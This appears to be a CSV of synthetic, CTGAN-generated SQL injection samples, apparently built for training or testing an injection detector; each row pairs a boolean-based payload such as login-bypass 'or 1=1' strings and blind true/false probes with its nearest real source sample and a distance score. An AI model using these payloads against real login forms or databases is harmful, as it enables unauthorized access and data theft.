id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000027,attack,boolean,admin' or 1  =  1/*,nearest_attack_euclidean,R000026,7.953304640782228
CTGAN_000028,attack,boolean,1' and 6621  =  4681--,nearest_attack_euclidean,R000274,6.004743677491046
CTGAN_000029,attack,boolean,admin' or '1'  =  '1'#,nearest_attack_euclidean,R000020,7.799214487946532
CTGAN_000030,attack,boolean,"1""  )   and 8677  =  9054#",nearest_attack_euclidean,R000240,4.9528077354273545
CTGAN_000031,attack,boolean,1' and 6621  =  4681--,nearest_attack_euclidean,R000274,5.446982560373809
CTGAN_000032,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,5.660241426133823
CTGAN_000033,attack,boolean,"1"" and 6637  =  2321",nearest_attack_euclidean,R000210,6.231245196888971
CTGAN_000034,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,6.675106609585726
CTGAN_000035,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R000220,5.227358610028446
CTGAN_000036,attack,boolean,"admin"" or 1  =  1/*",nearest_attack_euclidean,R000068,5.819855371644371
CTGAN_000037,attack,boolean,hi' or 'a'  =  'a,nearest_attack_euclidean,R000085,6.577772945745752
CTGAN_000038,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,6.620476344171516
CTGAN_000039,attack,boolean,"admin"" or 1  =  1/*",nearest_attack_euclidean,R000068,9.250633616751283
CTGAN_000040,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,9.28261133154165
CTGAN_000041,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,5.871878694417145
CTGAN_000042,attack,boolean,"1%""  )   and 2006  =  2006",nearest_attack_euclidean,R000094,5.078736370602522
CTGAN_000043,attack,boolean,1  )   and 9198  =  9198--,nearest_attack_euclidean,R000190,7.145773031224241
CTGAN_000044,attack,boolean," end and   (  ""vwbx""  =  ""vwbx",nearest_attack_euclidean,R000096,7.310930604972248
CTGAN_000045,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000063,7.694735929060497
CTGAN_000046,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,5.842466305394673
CTGAN_000047,attack,boolean,"1""  )   and 2954  =  1256--",nearest_attack_euclidean,R000216,6.701281815354145
CTGAN_000048,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,4.118240999240027
CTGAN_000049,attack,boolean,admin' or 1  =  1/*,nearest_attack_euclidean,R000026,6.1521007287544585
CTGAN_000050,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000197,5.620982497741518
CTGAN_000051,attack,boolean,"-7579%"" or 6570  =  1764",nearest_attack_euclidean,R000262,6.750843733462988
CTGAN_000052,attack,boolean,"1"" and 9198  =  9198--",nearest_attack_euclidean,R000132,5.729671228776939
CTGAN_000053,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000048,5.606411249945721
CTGAN_000054,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R000220,4.521815993408023
CTGAN_000055,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,6.375209916091616
CTGAN_000056,attack,boolean,  )   or true--,nearest_attack_euclidean,R000064,7.515363970092583
CTGAN_000057,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,6.864785491204438
CTGAN_000058,attack,boolean,-4562'  )   or 3038  =  3038,nearest_attack_euclidean,R000187,7.48842901216933
CTGAN_000059,attack,boolean,â or 3  =  3 --,nearest_attack_euclidean,R000035,7.154592117031108
CTGAN_000060,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,6.230604383339285
CTGAN_000061,attack,boolean,admin' or 1  =  1/*,nearest_attack_euclidean,R000026,6.7294260283589695
CTGAN_000062,attack,boolean,"-7295""  )   or 9323  =  9323#",nearest_attack_euclidean,R000193,5.064835330149472
CTGAN_000063,attack,boolean,"1"" and 9198  =  9198--",nearest_attack_euclidean,R000132,5.481022444232004
CTGAN_000064,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,7.378590013704057
CTGAN_000065,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R000113,6.300612446142193
CTGAN_000066,attack,boolean,end and   (  9416  =  9416,nearest_attack_euclidean,R000160,7.6250519970364135
CTGAN_000067,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,5.594828694549492
CTGAN_000068,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,7.304394398597999
CTGAN_000069,attack,boolean,1' and 6621  =  4681--,nearest_attack_euclidean,R000274,7.170808625800458
CTGAN_000070,attack,boolean,1 and 8398  =  1891-- naov,nearest_attack_euclidean,R000251,6.152202147637814
CTGAN_000071,attack,boolean,"admin"" or 1  =  1#",nearest_attack_euclidean,R000011,5.508194801731487
CTGAN_000072,attack,boolean,1' and 4374  =  2305,nearest_attack_euclidean,R000115,7.723034298610807
CTGAN_000073,attack,boolean,’ or ‘1’  =  ’1,nearest_attack_euclidean,R000061,6.5300999026605915
CTGAN_000074,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R000253,6.847601082138049
CTGAN_000075,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000074,9.315420876358079
CTGAN_000076,attack,boolean,-1772' or 7911  =  4985#,nearest_attack_euclidean,R000242,6.327199716954914
CTGAN_000077,attack,boolean,"1""  )   and 4760  =  2922",nearest_attack_euclidean,R000177,6.359489792250895
CTGAN_000078,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,5.903310896067121
CTGAN_000079,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000005,6.634354737783194
CTGAN_000080,attack,boolean,1%' and 2006  =  2006,nearest_attack_euclidean,R000218,5.111195205914572
CTGAN_000081,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,6.658793460915837
CTGAN_000082,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R000248,6.641019330243614
CTGAN_000083,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000106,5.763536176709041
CTGAN_000084,attack,boolean," end and ""xouo"" like ""xouo",nearest_attack_euclidean,R000112,7.97238288312236
CTGAN_000085,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000215,5.887735603926927
CTGAN_000086,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,7.296187608614437
CTGAN_000087,attack,boolean,admin' or '1'  =  '1'--,nearest_attack_euclidean,R000060,7.6780554792747315
CTGAN_000088,attack,boolean,1 and 9412  =  6877#,nearest_attack_euclidean,R000152,5.576155185157063
CTGAN_000089,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000197,5.824661290934949
CTGAN_000090,attack,boolean,"admin"" or ""1""  =  ""1",nearest_attack_euclidean,R000066,5.4119983785288195
CTGAN_000091,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,7.090153088364547
CTGAN_000092,attack,boolean,-1700%' or 4149  =  3391#,nearest_attack_euclidean,R000134,8.525755711204447
CTGAN_000093,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000209,6.063066360627498
CTGAN_000094,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R000253,5.840180780546751
CTGAN_000095,attack,boolean,admin' or 1  =  1#,nearest_attack_euclidean,R000003,5.855467387079541
CTGAN_000096,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000074,8.29213837906489
CTGAN_000097,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R000250,6.215394330078577
CTGAN_000098,attack,boolean,1'  )   and 9198  =  9198--,nearest_attack_euclidean,R000100,5.355849790612915
CTGAN_000099,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R000253,4.213604907991944
CTGAN_000100,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,4.475997768813852
CTGAN_000101,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000209,7.445751727712579
CTGAN_000102,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,6.613174967989545
CTGAN_000103,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,5.87588638840992
CTGAN_000104,attack,boolean,"1"" and 5205  =  9975#",nearest_attack_euclidean,R000130,6.33881170200029
CTGAN_000105,attack,boolean,1  )   and 3861  =  5813--,nearest_attack_euclidean,R000243,6.400134965991696
CTGAN_000106,attack,boolean,1'  )   and 7533  =  7533,nearest_attack_euclidean,R000173,6.436006053506548
CTGAN_000107,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R000192,8.746761174603998
CTGAN_000108,attack,boolean,1 and 7533  =  7533-- spzi,nearest_attack_euclidean,R000207,6.729030439059543
CTGAN_000109,attack,boolean,"-9265""  )   or 7834  =  1685",nearest_attack_euclidean,R000194,5.642249042165747
CTGAN_000110,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000197,5.50735763396746
CTGAN_000111,attack,boolean,  )   or true--,nearest_attack_euclidean,R000064,6.577442480841144
CTGAN_000112,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,6.131635977074291
CTGAN_000113,attack,boolean,1  )   and 3861  =  5813--,nearest_attack_euclidean,R000243,6.494094122872484
CTGAN_000114,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,7.3434234576559385
CTGAN_000115,attack,boolean,end and   (  '%'  =  ',nearest_attack_euclidean,R000211,6.912382151184909
CTGAN_000116,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R000220,4.715958606577005
CTGAN_000117,attack,boolean,admin' or '1'  =  '1,nearest_attack_euclidean,R000014,4.584555691996198
CTGAN_000118,attack,boolean,1'  )   and 9198  =  9198--,nearest_attack_euclidean,R000100,6.368171428708401
CTGAN_000119,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,6.487240526997413
CTGAN_000120,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,6.28182175112685
CTGAN_000121,attack,boolean,1 and 9122  =  4153# nxcv,nearest_attack_euclidean,R000279,5.058003738647576
CTGAN_000122,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,5.851925654029705
CTGAN_000123,attack,boolean,"1""  )   and 4760  =  2922",nearest_attack_euclidean,R000177,3.0704690777827235
CTGAN_000124,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,4.775828359301045
CTGAN_000125,attack,boolean,"admin"" or ""1""  =  ""1",nearest_attack_euclidean,R000066,8.657045397975986
CTGAN_000126,attack,boolean,-7346 or 8571  =  8571--,nearest_attack_euclidean,R000149,4.830859858963496
CTGAN_000127,attack,boolean,1' and 1541  =  6868#,nearest_attack_euclidean,R000102,6.27514584046719
CTGAN_000128,attack,boolean,"1""  )   and 2954  =  1256--",nearest_attack_euclidean,R000216,6.996261922762935
CTGAN_000129,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000209,6.737717893520194
CTGAN_000130,attack,boolean,  )   or true--,nearest_attack_euclidean,R000064,6.665215244087953
CTGAN_000131,attack,boolean,1  )   and 3861  =  5813--,nearest_attack_euclidean,R000243,6.3048831256378275
CTGAN_000132,attack,boolean,’ or ‘1’  =  ’1,nearest_attack_euclidean,R000061,6.600727734659656
CTGAN_000133,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,5.23459281845978
CTGAN_000134,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,5.117926564650551
CTGAN_000135,attack,boolean,1' and 6621  =  4681--,nearest_attack_euclidean,R000274,6.342648243796956
CTGAN_000136,attack,boolean,1'  )   and 2577  =  7094,nearest_attack_euclidean,R000191,5.049502527064689
CTGAN_000137,attack,boolean,"or 0  =  0 #""",nearest_attack_euclidean,R000016,5.420445816883791
CTGAN_000138,attack,boolean,1%' and 1736  =  4220,nearest_attack_euclidean,R000147,5.9044415178867204
CTGAN_000139,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000048,7.2640415615140626
CTGAN_000140,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,8.528909527773134
CTGAN_000141,attack,boolean,1'  )   and 7533  =  7533,nearest_attack_euclidean,R000173,5.557076130675933
CTGAN_000142,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,7.427040829389258
CTGAN_000143,attack,boolean,1 and 7533  =  7533-- spzi,nearest_attack_euclidean,R000207,5.021484150135564
CTGAN_000144,attack,boolean,"-7306"" or 2081  =  6847",nearest_attack_euclidean,R000245,6.496753820965292
CTGAN_000145,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,6.626282242661592
CTGAN_000146,attack,boolean,â or 3  =  3 --,nearest_attack_euclidean,R000035,6.297410639136128
CTGAN_000147,attack,boolean,"hi or 1  =  1 --""",nearest_attack_euclidean,R000039,5.917334717495226
CTGAN_000148,attack,boolean,end and 'aenf'  =  'aenf,nearest_attack_euclidean,R000246,8.263216275904416
CTGAN_000149,attack,boolean,1%' and 2006  =  2006,nearest_attack_euclidean,R000218,5.277450592368765
CTGAN_000150,attack,boolean,"1""  )   and 4595  =  4595#",nearest_attack_euclidean,R000272,6.206363073755424
CTGAN_000151,attack,boolean,1 and 8398  =  1891-- naov,nearest_attack_euclidean,R000251,3.9220449123769447
CTGAN_000152,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R000271,7.626618983656627
CTGAN_000153,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R000227,5.954818171089245
CTGAN_000154,attack,boolean,-8047' or 3038  =  3038,nearest_attack_euclidean,R000276,6.076800630713822
CTGAN_000155,attack,boolean,"admin""  )   or ""1""  =  ""1""/*",nearest_attack_euclidean,R000084,7.291425529131693
CTGAN_000156,attack,boolean,1  )   and 3861  =  5813--,nearest_attack_euclidean,R000243,6.380233941264626
CTGAN_000157,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,5.765870708792537
CTGAN_000158,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,4.41638043841196
CTGAN_000159,attack,boolean,-8047' or 3038  =  3038,nearest_attack_euclidean,R000276,5.368023095900884
CTGAN_000160,attack,boolean,1%'  )   and 8734  =  5844,nearest_attack_euclidean,R000309,5.657196042830406
CTGAN_000161,attack,boolean,admin' or 1  =  1#,nearest_attack_euclidean,R000003,6.119319953388256
CTGAN_000162,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,5.612170111345175
CTGAN_000163,attack,boolean,-4557 or 6872  =  6872-- kkte,nearest_attack_euclidean,R000111,7.299565689772511
CTGAN_000164,attack,boolean,"-5630""  )   or 3038  =  3038",nearest_attack_euclidean,R000204,5.289859820696654
CTGAN_000165,attack,boolean,1' and 6621  =  4681--,nearest_attack_euclidean,R000274,4.819081887623129
CTGAN_000166,attack,boolean,"-1048%"" or 3038  =  3038",nearest_attack_euclidean,R000143,3.4897125980916637
CTGAN_000167,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,7.001555028763291
CTGAN_000168,attack,boolean,1%'  )   and 9198  =  9198--,nearest_attack_euclidean,R000205,5.646837378197434
CTGAN_000169,attack,boolean,hi' or 1  =  1 --,nearest_attack_euclidean,R000069,6.988890160095947
CTGAN_000170,attack,boolean,1' and 4374  =  2305,nearest_attack_euclidean,R000115,5.923428862996022
CTGAN_000171,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,5.90609930491236
CTGAN_000172,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,6.204027663417623
CTGAN_000173,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000197,6.12898561708411
CTGAN_000174,attack,boolean,1%' and 2006  =  2006,nearest_attack_euclidean,R000218,6.447763985655907
CTGAN_000175,attack,boolean,admin' or 1  =  1/*,nearest_attack_euclidean,R000026,7.161678518418573
CTGAN_000176,attack,boolean,"1"" and 9198  =  9198--",nearest_attack_euclidean,R000132,5.462936306888021
CTGAN_000177,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000074,10.53632412110227
CTGAN_000178,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000209,5.075903306964192
CTGAN_000179,attack,boolean,1 and 7533  =  7533-- spzi,nearest_attack_euclidean,R000207,5.556840748944115
CTGAN_000180,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000048,4.996663802061553
CTGAN_000181,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,5.484712004581421
CTGAN_000182,attack,boolean,1' and 7533  =  7533,nearest_attack_euclidean,R000249,5.2005681546087885
CTGAN_000183,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,4.508601188844782
CTGAN_000184,attack,boolean,1  )   and 9198  =  9198--,nearest_attack_euclidean,R000190,6.9816501564087945
CTGAN_000185,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000197,6.137112618079147
CTGAN_000186,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,6.240812421617285
CTGAN_000187,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R000113,6.038402187230467
CTGAN_000188,attack,boolean,1%' and 9127  =  7687--,nearest_attack_euclidean,R000155,4.815341538709972
CTGAN_000189,attack,boolean,"-7306"" or 2081  =  6847",nearest_attack_euclidean,R000245,5.72345308227113
CTGAN_000190,attack,boolean,1'  )   and 8404  =  8651#,nearest_attack_euclidean,R000175,4.988635723705181
CTGAN_000191,attack,boolean,admin' or '1'  =  '1,nearest_attack_euclidean,R000014,5.572149016280028
CTGAN_000192,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,6.492727296953431
CTGAN_000193,attack,boolean,end and   (  9416  =  9416,nearest_attack_euclidean,R000160,6.710134014969494
CTGAN_000194,attack,boolean,admin' or '1'  =  '1,nearest_attack_euclidean,R000014,5.623736565511018
CTGAN_000195,attack,boolean,"-9111"" or 3038  =  3038",nearest_attack_euclidean,R000267,5.476266772282232
CTGAN_000196,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,5.720688665212711
CTGAN_000197,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,5.080268964665874
CTGAN_000198,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,7.244850784737496
CTGAN_000199,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,6.5327318692564855
CTGAN_000200,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R000220,5.107223563897607
